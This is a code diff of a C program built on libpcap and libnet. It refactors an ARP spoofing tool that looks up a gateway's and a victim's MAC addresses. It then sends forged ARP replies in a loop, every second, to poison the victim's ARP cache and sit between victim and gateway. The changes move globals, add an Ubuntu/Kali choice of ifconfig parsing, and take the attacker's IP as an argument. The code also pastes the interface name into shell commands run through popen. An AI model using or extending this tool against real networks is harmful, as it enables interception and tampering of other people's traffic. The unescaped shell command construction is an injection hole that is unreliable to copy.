@@ -9,31 +9,46 @@
 #include <arpa/inet.h> 
 #include <time.h>
 
-void get_mine(const char *dev, struct in_addr *my_IP, struct ether_addr *my_MAC) 
+
+struct in_addr my_IP;
+struct ether_addr my_MAC;
+
+int get_mine(const char *dev) 
 { 
 	FILE* ptr; 
 	char cmd[300]={0x0}; 
 	char MAC[20] = {0x0};  
-	char IP[20] = {0x0}; 
+	int num;
 
-	sprintf(cmd,"ifconfig | grep HWaddr | grep %s | awk '{print $5}'",dev);  
-	ptr = popen(cmd, "r"); 
-	fgets(MAC, sizeof(MAC), ptr); 
-	pclose(ptr); 
+	printf("1. Ubuntu 2. Kali \n");
+	scanf("%d",&num);
+	printf("\n");
 
-	ether_aton_r(MAC, my_MAC);  
+	if(num == 1)
+	{
+		sprintf(cmd,"ifconfig | grep HWaddr | grep %s | awk '{print $5}'", dev);  
+		ptr = popen(cmd, "r"); 
+		fgets(MAC, sizeof(MAC), ptr); 
+		pclose(ptr); 
 
-	sprintf(cmd,"ifconfig | grep -A 1 %s | tail -n 1 | awk '{print $2}' | awk -F':' '{print $2}'",dev);  
-	ptr = popen(cmd, "r");  
-	fgets(IP, sizeof(IP), ptr); 
-	pclose(ptr); 
-
-	inet_aton(IP, my_IP);  
-
-	return; 
+		ether_aton_r(MAC, &my_MAC);  
+	}
+	
+	if(num == 2)
+	{
+		
+		sprintf(cmd,"ifconfig | grep -A 3 %s | grep ether | awk '{print $2}'", dev);  
+		ptr = popen(cmd, "r");  
+		fgets(MAC, sizeof(MAC), ptr); 
+		pclose(ptr); 
+		
+		ether_aton_r(MAC, &my_MAC);
+	}
+	
+	return 0;
 } 
 
-void get_gatewayIP(const char *dev, struct in_addr *gateway_IP) 
+int get_gatewayIP(const char *dev, struct in_addr *gateway_IP) 
 { 
 	FILE* ptr; 
 	char cmd[300] = {0x0}; 
@@ -46,11 +61,11 @@ void get_gatewayIP(const char *dev, struct in_addr *gateway_IP)
 
 	inet_aton(IP, gateway_IP); 
 
-	return; 
+	return 0; 
 } 
 
 
-void sendarp(const char *dev, pcap_t *pcd, const struct in_addr *victim_IP, struct ether_addr *victim_MAC) 
+int sendarp(pcap_t *pcd, const struct in_addr *victim_IP, struct ether_addr *victim_MAC) 
 { 
 	 
 	char errbuf[PCAP_ERRBUF_SIZE];     
@@ -61,8 +76,8 @@ void sendarp(const char *dev, pcap_t *pcd, const struct in_addr *victim_IP, stru
 	struct libnet_ethernet_hdr *ethhdr_reply; 
 	struct ether_arp *arphdr_reply; 
 
-	struct in_addr my_IP; 
-	struct ether_addr my_MAC;     
+	//struct in_addr my_IP; 
+	//struct ether_addr my_MAC;     
 	struct ether_addr ether_victim_MAC; 
 	struct ether_addr arp_victim_MAC; 
 	int i, res; 
@@ -73,8 +88,6 @@ void sendarp(const char *dev, pcap_t *pcd, const struct in_addr *victim_IP, stru
 	const int etherhdr_size = sizeof(struct libnet_ethernet_hdr); 
 	const int arphdr_size = sizeof(struct ether_arp); 
 	u_char buffer[etherhdr_size + arphdr_size];  
-
-	get_mine(dev, &my_IP, &my_MAC); 
 
 	for(i=0; i<6; i++) 
 	{ 
@@ -131,11 +144,13 @@ void sendarp(const char *dev, pcap_t *pcd, const struct in_addr *victim_IP, stru
 				} 
 			}
 		} 
-	} 
+	}
+
+	return 0; 
 } 
 
 
-void ARP_Spoofing(pcap_t *pcd, const struct in_addr *gateway_IP, const struct ether_addr *my_MAC, const struct in_addr *victim_IP, const struct ether_addr *victim_MAC) 
+int ARP_Spoofing(pcap_t *pcd, const struct in_addr *gateway_IP, const struct ether_addr *my_MAC, const struct in_addr *victim_IP, const struct ether_addr *victim_MAC) 
 { 
 	const int etherhdr_size = sizeof(struct libnet_ethernet_hdr); 
 	const int arphdr_size = sizeof(struct ether_arp); 
@@ -173,7 +188,7 @@ void ARP_Spoofing(pcap_t *pcd, const struct in_addr *gateway_IP, const struct et
 		sleep(1); 
 	} 
 
-	return; 
+	return 0; 
 } 
 
 
@@ -183,16 +198,14 @@ int main(int argc, char **argv)
 	char errbuf[PCAP_ERRBUF_SIZE]; 
 	pcap_t *pcd; 
 
-	struct in_addr my_IP; 
 	struct in_addr victim_IP;  
 	struct in_addr gateway_IP; 
-	struct ether_addr my_MAC; 
 	struct ether_addr gateway_MAC={0x0}; 
 	struct ether_addr victim_MAC={0x0};   
 	
-	if(argc != 3)
+	if(argc != 4)
 	{
-		printf("Select the interface, victim_IP \n");
+		printf("./send_arp [interface] [my_IP] [victim_IP] \n");
 		return 0;
 	}
 
@@ -205,24 +218,29 @@ int main(int argc, char **argv)
 		printf("%s\n", errbuf); 
 		exit(1); 
 	} 
-
-	if(inet_aton(argv[2], &victim_IP)==0) 
+	
+	if(inet_aton(argv[2], &my_IP)==0)
+	{
+		printf("error : %s\n", argv[2]);
+		exit(1);
+	}
+	if(inet_aton(argv[3], &victim_IP)==0) 
 	{ 
-		printf("error : %s \n", argv[2]); 
+		printf("error : %s\n", argv[3]); 
 		exit(1); 
 	} 
 
-	get_mine(dev, &my_IP, &my_MAC); 
+	get_mine(dev); 
 	get_gatewayIP(dev, &gateway_IP); 
 	printf("gateway_IP : %s\n", inet_ntoa(gateway_IP));
 
 	printf("gateway_MAC : ");     
-	sendarp(dev, pcd, &gateway_IP, &gateway_MAC); 
+	sendarp(pcd, &gateway_IP, &gateway_MAC); 
 
 	printf("victim_IP : %s\n", inet_ntoa(victim_IP));
 	
 	printf("victim_MAC : "); 
-	sendarp(dev, pcd, &victim_IP, &victim_MAC); 
+	sendarp(pcd, &victim_IP, &victim_MAC); 
 	
 	ARP_Spoofing(pcd, &gateway_IP, &my_MAC, &victim_IP, &victim_MAC); 
 
